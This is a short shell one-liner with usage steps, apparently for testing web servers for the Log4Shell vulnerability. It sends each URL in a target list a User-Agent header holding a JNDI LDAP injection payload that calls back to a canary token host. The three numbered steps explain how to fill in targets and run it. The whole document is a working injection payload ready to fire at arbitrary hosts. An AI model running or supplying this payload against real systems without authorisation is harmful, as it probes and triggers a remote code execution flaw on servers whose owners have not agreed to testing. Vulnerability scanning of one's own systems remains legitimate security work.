cat urls.txt  | while read url; do log4=$(curl -s -L $url -H User-Agent:"${jndi:ldap://REPLACE.canarytokens.com/a}");echo -e "$url -> User-Agent: SENT!";done

1) Create urls.txt  - populate with targets to test
2) Replace the REPLACE with your canary token ID or replace the entire UA(Useragent) "${jndi:ldap://REPLACE.canarytokens.com/a}"
3) execute/run script/command
